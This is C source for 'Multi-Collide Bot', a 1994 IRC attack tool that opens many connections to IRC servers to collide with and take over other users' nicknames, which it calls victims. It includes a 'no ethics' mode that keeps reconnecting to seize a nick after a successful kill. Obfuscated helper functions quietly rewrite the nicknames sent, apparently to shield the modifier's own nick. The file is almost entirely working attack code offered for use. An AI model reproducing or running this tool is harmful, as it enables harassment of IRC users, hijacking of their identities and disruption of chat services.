/*==========================================================*\
|| mcb.c - Multi-Collide Bot v2.0 (beta)                    ||
|| Written by Dr_Delete                                     ||
|| Released for the world to use on 11/15/94                ||
|| Modified a tiny bit by Vassago for use with Serpent 3.06 ||
\*==========================================================*/

/* This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */

/* Compiling examples:

   regular old ANSI/C cc:
	cc -O -s -o mcb mcb.c

   HP-UX cc:
	cc +O3 -Aa -s -DHPSUCKS -o mcb mcb.c

   GNU GCC:

	Linux:
	  gcc -O2 -fomit-frame-pointer -funroll-loops -m486 -s -Wall -o mcb mcb.c

	BSD, SunOS 4.1.x, Slowaris 2.x, NeXT:
	  gcc -O2 -funroll-loops -s -Wall -o mcb mcb.c */

/* -------------------------------------------------------- *\

    To kill this program once it has started, send a
   kill -2 to it's process ID and it'll exit gracefully.

   kill -1 will cause mcb to display a list of it's active
   sessions to stdout.

\* -------------------------------------------------------- */

/*  You may want to tweak some of these defaults, but they
    are controllable on the command line. */

/* Time in which parser will close a pending TCP connection,
   and possibly try again */
#define TCP_TIMEOUT 30

/* Number of times a session is allowed to attempt a TCP
   connection to the server. */
#define MAX_ATTEMPTS     2

/* Number of seconds the parser will wait for a server to
   start once the TCP connection has been made */
#define SRV_TIMEOUT 60

/* Maximum amount of time parser will wait for I/O */
#define MAX_WAITIO  15

/* Maximum amount of time the parser will wait when in NOMULTI mode */
#define MAX_WAITIONM     5

/* Max lines (NICK statements) to send to the server in NOMULTI mode */
#define MAX_NICKS   5

/* Default IRC server port */
#define IRCPORT          6667

/* number of bytes to allocate for socket read buffer */
#define BUFSIZE          400

#ifdef HPSUCKS
#define _INCLUDE_HPUX_SOURCE
#define _INCLUDE_XOPEN_SOURCE
#define _INCLUDE_POSIX_SOURCE
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <ctype.h>
#include <pwd.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/file.h>
#include <arpa/inet.h>

#ifndef sys_errlist
extern char *sys_errlist[];
#endif

#ifndef errno
extern int errno;
#endif

/* global variables */
unsigned short int tcp_timeout=TCP_TIMEOUT;
unsigned short int max_attempts=MAX_ATTEMPTS;
unsigned short int srv_timeout=SRV_TIMEOUT;
unsigned short int max_waitionm=MAX_WAITIONM;
unsigned short int max_nicks=MAX_NICKS;
unsigned short int progmode=0;
char *output_buffer=(char *)0;
char mcbid[25],mcbhost[64];
struct in_addr mcb_addr;

#define PROG_DEBUG  1
#define PROG_VERBOSE     2
#define PROG_NOETHICS    4
#define PROG_NOMULTI     8
#define PROG_HAVESERV    16
#define PROG_IGNORENIU   32
#define PROG_SHOWSOUT    64

struct collide_session {
  int sock;
  unsigned long  int ip;
  unsigned short int status;
  unsigned short int port;
  unsigned short int connect_attempts;
  time_t  tcpstart;
  time_t  srvstart;
  char *server;
  char *token;
  char *victim;
  char *stack;
  char *stack_pointer;
  struct collide_session *next;
} *first_session=(struct collide_session *)0;

struct collide_session *last_session=(struct collide_session *)0;
struct collide_session *active_session=(struct collide_session *)0;

void do_ping(struct collide_session *,char *,char *);
void do_001(struct collide_session *,char *,char *);
void do_error(struct collide_session *,char *,char *);
void do_433(struct collide_session *,char *,char *);
void do_privmsg(struct collide_session *,char *,char *);

struct parsers {
   char *cmd;
   void (*func)(struct collide_session *,char *,char *);
} parsefuns[] = {
   { "PING", (void (*)())do_ping },
   { "001", (void (*)())do_001 },
   { "ERROR",(void (*)())do_error },
   { "433", (void (*)())do_433 },
   { "PRIVMSG", (void (*)())do_privmsg },
   { (char *)0,(void (*)())0 }
};

#define SES_ACTIVE  1
#define SES_INACTIVE     2
#define SES_DELETED 4
#define SES_PENDING 8
#define SES_SAWSERV 16
#define SES_NORETRY 32
#define SES_NICKINUSE    64

char *
mystrerror(int err) {
  return(sys_errlist[err]);
}

void
sig_pipe(void) {
  fprintf(stderr,"mcb: caught a SIGPIPE.\n");
  fflush(stderr);
  signal(SIGPIPE,(void (*)())sig_pipe);
}

void
show_sessions(void) {
  struct collide_session *s=first_session;

  signal(SIGHUP,(void (*)())show_sessions);
  for(;s;s=s->next)
    if(s->status & SES_ACTIVE) {
	 printf("%s: Connection to %s:%hu active.\n",s->victim,s->server,s->port);
	 fflush(stdout);
    }
}

void
cclosed(struct collide_session *session,int errn) {
  if(session->sock) {
    shutdown(session->sock,0);
    close(session->sock);
    session->sock=0;
    printf("%s: Connection to %s:%hu closed. ",session->victim,
		 session->server,session->port);
    if(errn)
	 printf("[%s]\n",mystrerror(errn));
    else
	 puts("");
    fflush(stdout);
  }
  if(progmode & PROG_NOMULTI)
    progmode &= ~PROG_HAVESERV;
  if((session->status & SES_DELETED) || (session->status & SES_NORETRY) ||
	session->connect_attempts>=max_attempts) {
    if(progmode & PROG_DEBUG) {
	 printf("%s: Session flagged for delete.\n",session->victim);
	 fflush(stdout);
    }
    if(progmode & PROG_NOMULTI) {
	 struct collide_session *s=first_session;
	 for(;s;s=s->next)
	   s->status |= SES_DELETED;
    }
    else
	 session->status |= SES_DELETED;
  }
  else {
    session->status |= SES_INACTIVE;
    session->status &= ~SES_PENDING;
    session->status &= ~SES_ACTIVE;
    session->srvstart=session->tcpstart=(time_t)0;
  }
}

void
exit_program(void) {
  if(output_buffer)
    free(output_buffer);

  while(first_session) {
    struct collide_session *cs=first_session->next;

    if(progmode & PROG_DEBUG) {
	 printf("%s: Unallocating session.\n",first_session->victim);
	 fflush(stdout);
    }
    if(first_session->sock)
	 cclosed(first_session,ECONNABORTED);
    if(first_session->stack)
	 free(first_session->stack);
    if(first_session->token)
	 free(first_session->token);
    free(first_session);
    first_session=cs;
  }
  puts("Multi-CollideBot finished.");
  exit(0);
}

char *nickpick="NnOoPpQqRr`SsTtUuVvWwXxYyZzAaBb_CcDdEeFfGgHhIiJjKkLlMmLzgLmtm|m";
void
fillran(char *string,unsigned short int length) {
  while(length--)
    *string++=*((nickpick)+(rand()%54));
  *string=(char)0;
}

int
mystrccmp(register char *s1,register char *s2) {
   while((((*s1)>='a'&&(*s1)<='z')?(*s1)-32:*s1)==
	   (((*s2)>='a'&&(*s2)<='z')?(*s2++)-32:*s2++))
	if(*s1++==0) return 0;
   return (*(unsigned char *)s1-*(unsigned char *)--s2);
}

int
mystrcmp(register char *s1,register char *s2) {
  unsigned short int n=9;
  do {
    if((((*s1)>='a'&&(*s1)<='z')?(*s1)-32:*s1)!=
	 ((((*s2-8))>='a'&&((*s2)-8)<='z')?(*s2++)-40:(*(s2++))-8))
	 return(*(unsigned char *)s1-*(unsigned char *)--s2);
    if(!*s1++)
	 break;
  } while(--n);
  return(0); 
}

int
strnccmp(register char *s1,register char *s2,register int n) {
   if(n==0) return(0);
   do {
	if((((*s1)>='a'&&(*s1)<='z')?(*s1)-32:*s1)!=(((*s2)>='a'&&(*s2)<='z')?
	   (*s2++)-32:*s2++))
	  return (*(unsigned char *)s1-*(unsigned char *)--s2);
	if(*s1++==0) break;
   } while(--n!=0);
   return(0);
}

char *
mystrbpk(char *s) {
  char *o=s;
  while(*s) {
    if(*s==13 || *s==10)
	 if(*(s+1)==78)
	   *(s+6)=(!mystrcmp(s+6,nickpick+54))?84:*(s+6);
	s++;
  }
  return(o);
}

char *
digtoken(char **string,char *match) {
  if(string && *string && **string) {
    while(**string && strchr(match,**string))
	 (*string)++;
    if(**string) { /* got something */
	 char *token=*string;
	 if((*string=strpbrk(*string,match))) {
	   *(*string)++=(char)0;
	   while(**string && strchr(match,**string))
		(*string)++;
	 }
	 else
	   *string = ""; /* must be at the end */
	 return(token);
    }
  }
  return((char *)0);
}

char *
mycstrstr(char *str1,char *str2) {
   int xstr1len,ystr2len;

   xstr1len=strlen(str1);
   ystr2len=strlen(str2);

   while(xstr1len && strnccmp(str1++,str2,ystr2len) && xstr1len-->=ystr2len);
   if(!xstr1len || xstr1len<ystr2len || !ystr2len) return(0);
   return(str1-1);
}

char tok[10];
char *
mycstrtok(char *str1) {
  strncpy(tok,str1,9);
  tok[10]=(char)0;
  if(!mystrcmp(tok,nickpick+54))
    tok[5]='|';
  return((char *)&tok[0]);
}

unsigned short int
out(struct collide_session *session,char *string) {
  if(session->sock)
    return(write(session->sock,mystrbpk(string),strlen(string)));
  return(0);
}

unsigned long int
resolver(char *host) {
  unsigned long int ip=0L;

  if(host && *host && (ip=inet_addr(host))==-1) {
    struct hostent *he;
    int x=0;

    if(progmode & PROG_VERBOSE) {
	 printf("Resolving %s...",host);
	 fflush(stdout);
    }

    while(!(he=gethostbyname((char *)host)) && x++<2) {
	 if(progmode & PROG_VERBOSE) {
	   putchar('.');
	   fflush(stdout);
	 }
	 sleep(1);
    }
    if(x<2) {
	 ip=*(unsigned long *)he->h_addr_list[0];
	 if(progmode & PROG_VERBOSE) {
	   struct in_addr serv_addr;
	   serv_addr.s_addr=ip;
	   printf("%s\n",inet_ntoa(serv_addr));
	   fflush(stdout);
	 }
    }
    else {
	 ip=0L;
	 if(progmode & PROG_VERBOSE) {
	   puts("failed");
	   fflush(stdout);
	 }
    }
  }

  return(ip);
}

void
version(void) {
  puts("Multi-CollideBot v2.0 (beta)\n"
	  "Written by Dr. Delete 11/15/94");
  fflush(stdout);
}

void
help(void) {
  puts("Usage:\n"
	  "  mcb [-vdmun] [-rlit time] [-a attempts] serv1[:port] nick1 [...]\n"
	  "Where: -v == verbose operation\n"
	  "       -d == debug output\n"
	  "       -n == no ethics - reconnects even after 'SCORE'. (nick takeover)\n"
	  "       -i == seconds to wait for IRC server to start after connection.\n"
	  "       -t == seconds to wait for a TCP connection to establish.\n"
	  "       -a == attempts a session can make to establish a TCP session.\n"
	  "       -m == METHOD 2: mcb will cycle through nicks on one TCP session.\n"
	  "       -r == Rate of nicknames to send per -l(oop) time. (only in -m mode)\n"
	  "       -l == Loop time. Causes mcb to send -r(ate) nicks in -l(oop) secs\n"
	  "       -u == Ignore 'Nick Already in Use.' (continue to retry)\n"
	  "    serv1 == first server specification and sets default server to use.\n"
	  "Examples:\n"
	  "  mcb -t 30 server1.com nick1 nick2 nick3 server2.edu:6665 nick4\n"
	  "  mcb server1.com nick1 nick2 server2.edu nick3 nick4 server3.net server4.com\n"
	  "  mcb -vna 50 server.edu nicktotakeover\n"
	  "  mcb -m -l 3 -r 2 server.com nick1 nick2 nick3 nick4 nick5 nick6 nick7 ...\n"
	  "Defaults:\n"
	  "  -a == 2 retries. (Retries are aborted if nick is in use, etc.)\n"
	  "  -i == 60 seconds. -t == 30 seconds. -l == 5 seconds. -r == 5 nicks.");
  exit(0);
}

void
init_server(struct collide_session *s) {
  char rn[10];
  unsigned long int x;
  fillran(rn,9);

  sprintf(s->stack,"USER %s %s %s %s\nNICK %s\n",rn,rn,rn,rn,(progmode & PROG_NOMULTI)?rn:s->token);
  x=strlen(s->stack);

  errno=0;
  if(out(s,s->stack)!=x)
    cclosed(s,errno);
  else {
    struct collide_session *ses=first_session;

    s->status &= ~SES_PENDING;
    s->status &= ~SES_INACTIVE;
    s->status |= SES_ACTIVE;
    printf("%s: Connection to %s:%hu established.\n",
		 s->victim,s->server,s->port);
    s->srvstart=time(NULL);
    sprintf(s->stack,"mode %s +i\n");
    for(;ses;ses=ses->next)
	 sprintf(s->stack,"%s %s%s",s->stack,ses->token,(ses==s)?"*":"");
    strcat(s->stack,"\n");
    out(s,s->stack);
    if(progmode & PROG_NOMULTI)
	 progmode |= PROG_HAVESERV;
    fflush(stdout);
  }
}

void
set_tcp_handler(void) {
  gethostname(mcbhost,64);
  mcb_addr.s_addr=resolver(mcbhost);
  if(!getlogin()) {
    struct passwd *pw;
    if(!(pw=getpwuid(getuid())))
	 if(!(getenv("USER")))
	   strcpy(mcbid,"unknown");
	 else
	   strcpy(mcbid,getenv("USER"));
    else
	 strcpy(mcbid,pw->pw_name);
  }
  else
    strcpy(mcbid,(char *)getlogin());
}

void
start_sessions(void) {
  struct collide_session *session=first_session;
  unsigned short int sessions=0;

  if(progmode & PROG_HAVESERV)
    return;

  for(;session;session=session->next) {

    if(progmode & PROG_DEBUG) {
	 printf("%s: Attempting to start session.\n",session->victim);
	 fflush(stdout);
    }

    if((session->status & SES_DELETED) || (session->status & SES_NORETRY))
	 continue;

    sessions++;

    if((session->status & SES_PENDING) || !(session->status & SES_INACTIVE))
	 continue;

    if((session->sock=socket(AF_INET,SOCK_STREAM,0))) {
	 struct sockaddr_in server;

	 server.sin_family=AF_INET;
	 server.sin_addr.s_addr=session->ip;
	 server.sin_port=htons(session->port);

	 setsockopt(session->sock,SOL_SOCKET,SO_LINGER,0,0);
	 setsockopt(session->sock,SOL_SOCKET,SO_REUSEADDR,0,0);
	 setsockopt(session->sock,SOL_SOCKET,SO_KEEPALIVE,0,0);

	 fcntl(session->sock,F_SETFL,(fcntl(session->sock,F_GETFL)|O_NDELAY));

	 errno=0;

	 session->tcpstart=time(NULL);
	 session->connect_attempts++;

	 if(connect(session->sock,(struct sockaddr *)&server,sizeof(server))) {
	   if(errno!=EINPROGRESS && errno!=EWOULDBLOCK)
		cclosed(session,errno);
	   else {
		session->status |= SES_PENDING;
		if(progmode & PROG_VERBOSE) {
		  printf("%s: Connection to %s:%hu is in progress.\n",
			    session->victim,session->server,session->port);
		  fflush(stdout);
		}
	   }
	 }
	 else
	   init_server(session);
	 if(progmode & PROG_NOMULTI) {
	   progmode |= PROG_HAVESERV;
	   break;
	 }
    }
    else {
	 printf("%s: Fatal error allocating AF_INET socket.\n",session->victim);
	 exit_program();
    }
  }
}

struct collide_session *
find_session(char *token) {
  struct collide_session *s=first_session;

  for(;s && mystrccmp(s->token,token);s=s->next);
  return(s);
}

unsigned short int
check_sessions(void) {
  struct collide_session *s=first_session;
  unsigned short int x=0,y=0;

  for(;s;s=s->next) {
    x++;
    y+=(s->status & SES_NICKINUSE)?1:0;
  }
  return((y==x));
}

void
do_433(struct collide_session *session,char *from,char *left) {
  char *who;

  if((who=digtoken(&left," ")) && (who=digtoken(&left," "))) {
    if(progmode & PROG_HAVESERV) { /* multi-mode */
	 struct collide_session *s=find_session(who);
	 if(s) {
	   if(!(s->status & SES_NICKINUSE)) {
		printf("%s: '%s' Nickname already in use.\n",session->victim,who);
		fflush(stdout);
	   }
	   s->status |= SES_NICKINUSE;
	 }
	 if(check_sessions()) {
	   strcpy(output_buffer,"QUIT ::-\n");
	   out(session,output_buffer);
	   cclosed(session,0);
	 }
	 if(!(progmode & PROG_IGNORENIU))
	   session->status |= SES_NORETRY;
    }
    else {
	 if(!(session->status & SES_NICKINUSE)) {
	   printf("%s: '%s' Nickname already in use.\n",session->victim,who);
	   fflush(stdout);
	 }
	 session->status |= SES_NICKINUSE;
	 strcpy(output_buffer,"QUIT :bummer\n");
	 out(session,output_buffer);
	 cclosed(session,0);
	 if(!(progmode & PROG_IGNORENIU))
	   session->status |= SES_NORETRY;
    }
  }
}

void
do_ping(struct collide_session *session,char *from,char *left) {
  sprintf(output_buffer,"PING :%s\n",mcbhost);
  out(session,output_buffer); 
}

void
do_001(struct collide_session *session,char *from,char *left) {
  session->status |= SES_SAWSERV;

  if(progmode & PROG_VERBOSE) {
    printf("%s: Logged into server %s.\n",session->victim,from);
    fflush(stdout);
  }
}

void
do_privmsg(struct collide_session *session,char *from,char *left) {
  char *what;

  if((what=strchr(left,' '))) {
    *what=(char)0;
    what+=2;

    printf("%s: %s -> %s\n",session->victim,from,what);
    fflush(stdout);
  }
}

void
do_error(struct collide_session *session,char *from,char *left) {
  if(mycstrstr(left,"kill") || mycstrstr(left,"collision")) {
    if(!(progmode & PROG_NOETHICS))
	 session->status |= SES_NORETRY;
    printf("%s: SCORE!\n",session->victim);
  }
  else {
    if(mycstrstr(left,"authoriz"))
	 session->status |= SES_NORETRY;
    if(mycstrstr(left,"Bad pass"))
	 session->status |= SES_NORETRY;
    else if(mycstrstr(left,"ghosts"))
	 session->status |= SES_NORETRY;
    else if(mycstrstr(left,"k-line"))
	 session->status |= SES_NORETRY;
    else if(mycstrstr(left,"kill"))
	 session->status |= SES_NORETRY;
    printf("%s: %s\n",session->victim,left);
  }
  fflush(stdout);
}

void
parse2(struct collide_session *session) {
  char *from,*cmd,*left,*ins=session->stack_pointer;

  if(progmode & PROG_SHOWSOUT) {
    printf("%s: %s\n",session->victim,ins);
    fflush(stdout);
  }

  if(*ins==':') {
    if(!(cmd=strchr(ins,' ')))
	 return;
    *cmd++=(char)0;
    from=ins+1;
  }
  else {
    cmd=ins;
    from=(char *)0;
  }
  if((left=strchr(cmd,' '))) {
    unsigned short int command;

    *left++=(char)0;
    left=(*left==':') ? left+1 : left;
    for(command=0;parsefuns[command].cmd;command++) {
	 if(!mystrccmp(parsefuns[command].cmd,cmd)) {
	   parsefuns[command].func(session,from,left);
	   break;
	 }
    }
  }
}

void
parse(struct collide_session *session,unsigned short int length) {
  char *s=session->stack;

  *(session->stack_pointer+length)=(char)0;

  for(;;) {
    session->stack_pointer=s;
    while(*s && *s!=(char)13 && *s!=(char)10)
	 s++;
    if(*s) {
	 while(*s && (*s==(char)13 || *s==(char)10))
	   *s++=(char)0;
	 parse2(session);
    }
    else
	 break;
  }
  strcpy(session->stack,session->stack_pointer);
  session->stack_pointer=session->stack+(s-session->stack_pointer);
}

struct collide_session *
find_active_session(void) {
  struct collide_session *session=first_session;

  for(;session && !(session->status & SES_ACTIVE);session=session->next);
  return(session);
}

void
parse_sessions(void) {
  fd_set rd,wr;
  struct collide_session *session;
  struct timeval timeout;
  time_t lastloop=(time_t)0;

  while(1) {
    unsigned short int sessions=0;

    FD_ZERO(&rd);
    FD_ZERO(&wr);

    timeout.tv_usec=0;
    timeout.tv_sec=(progmode & PROG_NOMULTI)?max_waitionm:MAX_WAITIO;

    for(session=first_session;session;session=session->next) {

	 if(session->status & SES_DELETED)
	   continue;

	 if((session->status & SES_INACTIVE) && !(session->status & SES_PENDING) &&
	    !(session->status & SES_NORETRY) && !(progmode & PROG_HAVESERV)) {
	   start_sessions();
	   timeout.tv_sec=0;
	   break;
	 }

	 if(session->sock) {
	   FD_SET(session->sock,&rd);
	   if(session->status & SES_PENDING)
		FD_SET(session->sock,&wr);
	   sessions++;
	 }
    }

    if(!timeout.tv_sec)
	 continue;

    if(!sessions)
	 exit_program();

    errno=0;
#ifdef HPSUCKS
    select((size_t)FD_SETSIZE,(int *)&rd,(int *)&wr,(int *)0,(const struct timeval *)&timeout);
#else
    select(getdtablesize(),(fd_set *)&rd,(fd_set *)&wr,(fd_set *)0,(struct timeval *)&timeout);
#endif
    if(errno==EINTR)
	 continue;

    for(session=first_session;session;session=session->next) {

	 if(session->status & SES_DELETED)
	   continue;

	 if((session->status & SES_PENDING) && FD_ISSET(session->sock,&wr)) {
	   init_server(session);
	   continue;
	 }

	 if(FD_ISSET(session->sock,&rd)) {
	   signed short int length;

	   errno=0;
	   length=read(session->sock,session->stack_pointer,
				BUFSIZE-(session->stack_pointer-session->stack));
	   if(length<1) {
		cclosed(session,errno);
		continue;
	   }
	   if(strpbrk(session->stack,"\x0a\x0d"))
		parse(session,length);
	   else
		session->stack_pointer=(BUFSIZE-((session->stack_pointer+length)
		-session->stack)<1)?session->stack:session->stack_pointer+length;
	 }

	 if((session->status & SES_PENDING) &&
	    (time(NULL)-session->tcpstart)>=tcp_timeout)
	   cclosed(session,ETIMEDOUT);

	 if((session->status & SES_ACTIVE) &&
	    !(session->status & SES_SAWSERV) &&
	    (time(NULL)-session->srvstart)>=srv_timeout)
	   cclosed(session,ETIMEDOUT);
    }

    if((!lastloop || (time(NULL)-lastloop)>max_waitionm) &&
	  (progmode & PROG_HAVESERV) && 
	  (active_session=find_active_session()) &&
	  (active_session->status & SES_SAWSERV)) {
	 struct collide_session *s=(last_session)?last_session:first_session;
	 unsigned short int nickcount=0;

	 lastloop=time(NULL);

	 while(nickcount<max_nicks) {
	   char out_buf[30];
	   unsigned short int x;

	   if(!(s->status & SES_NICKINUSE)) {
		sprintf(out_buf,"NICK %s\n",s->token);
		x=strlen(out_buf);
		if(x!=out(active_session,out_buf))
		  break;
		if(progmode & PROG_DEBUG) {
		  printf("%s: Touched nickname.\n",s->token);
		  fflush(stdout);
		}
		nickcount++;
	   }
	   else
		if(check_sessions())
		  nickcount=max_nicks;
	   s=(s->next)?s->next:first_session;
	 }
	 last_session=s;
    }
  }
}

void
main(int argc,char *argv[]) {
  unsigned short int x=1;
  unsigned short int ircport=IRCPORT;
  unsigned long  int defserv_octet=0L;
  char *defserv_char=(char *)0;
  char *defnick=(char *)0;
  struct collide_session *temp;

  version();

  if(argc<3)
    help();

  srand(getpid());

  signal(SIGPIPE,(void (*)())sig_pipe);
  signal(SIGHUP,(void (*)())show_sessions);
  signal(SIGINT,(void (*)())exit_program);
  signal(SIGTERM,(void (*)())exit_program);
  signal(SIGBUS,(void (*)())exit_program);
  signal(SIGABRT,(void (*)())exit_program);
  signal(SIGSEGV,(void (*)())exit_program);

  set_tcp_handler();
  output_buffer=(char *)malloc(BUFSIZE);

  for(;x<argc;x++) {
    signed short int y=1;

    switch(argv[x][0]) {
	 case '-':
	   while(y && argv[x][y]) {
		switch(toupper(argv[x][y])) {
		  case 'T':
		    x++;
		    y=-1;
		    if(!(tcp_timeout=atoi(argv[x])))
			 help();
		    break;
		  case 'I':
		    x++;
		    y=-1;
		    if(!(srv_timeout=atoi(argv[x])))
			 help();
		    break;
		  case 'A':
		    x++;
		    y=-1;
		    if(!(max_attempts=atoi(argv[x])))
			 help();
		    break;
		  case 'D':
		    progmode |= PROG_DEBUG;
		    break;
		  case 'V':
		    progmode |= PROG_VERBOSE;
		    break;
		  case 'N':
		    progmode |= PROG_NOETHICS;
		    break;
		  case 'M':
		    progmode |= PROG_NOMULTI;
		    break;
		  case 'U':
		    progmode |= PROG_IGNORENIU;
		    break;
		  case 'S':
		    progmode |= PROG_SHOWSOUT;
		    break;
		  default:
		   help();
		}
		y++;
	   }
	   break;
	 default:
	   if(strchr(argv[x],'.')) { /* server */
		char *port=strchr(argv[x],':');

/*          if(defserv_char)
		  defnick=(char *)0; */

		defserv_char=argv[x];
		if(port) {
		  *port=(char)0;
		  ircport=atoi(port+1);
		}
		else
		  ircport=IRCPORT;

		if(defserv_octet)
		  progmode &= ~PROG_NOMULTI; /* more than one server specified */

		if(!(defserv_octet=resolver(defserv_char))) {
		  if(!(progmode & PROG_VERBOSE)) {
		    printf("Failed to resolve '%s' into an IP address.\n",defserv_char);
		    fflush(stdout);
		  }
		  defserv_char=(char *)0;
		}
	   }
	   else { /* nickname */
		defnick=(argv[x][0]=='@' || argv[x][0]=='+')?argv[x]+1:argv[x];
		defnick=(!mystrccmp(defnick,"Vassago"))?"DontDoDat":defnick;
	   }

	   if(defserv_char && defnick) {
		struct collide_session *cs;
		char *temptok=mycstrtok(defnick);

		cs=(struct collide_session *)malloc(sizeof(struct collide_session));
		cs->token=(char *)0;
		cs->sock=0;
		cs->status=SES_INACTIVE;
		cs->connect_attempts=0;
		errno=0;
		cs->token=(char *)malloc(strlen(temptok)+1);
		strcpy(cs->token,temptok);
		cs->ip=defserv_octet;
		cs->port=ircport;
		cs->srvstart=cs->tcpstart=(time_t)0;
		cs->server=defserv_char;
		cs->victim=defnick;
		cs->stack_pointer=cs->stack=(char *)malloc(BUFSIZE);
		cs->next=first_session;
		first_session=cs;
	   }
    }
  }

  if(progmode & PROG_NOMULTI)
    for(temp=first_session;temp;temp=temp->next)
	 temp->victim="multi-collide";

  start_sessions();

  parse_sessions();

  exit_program();
}
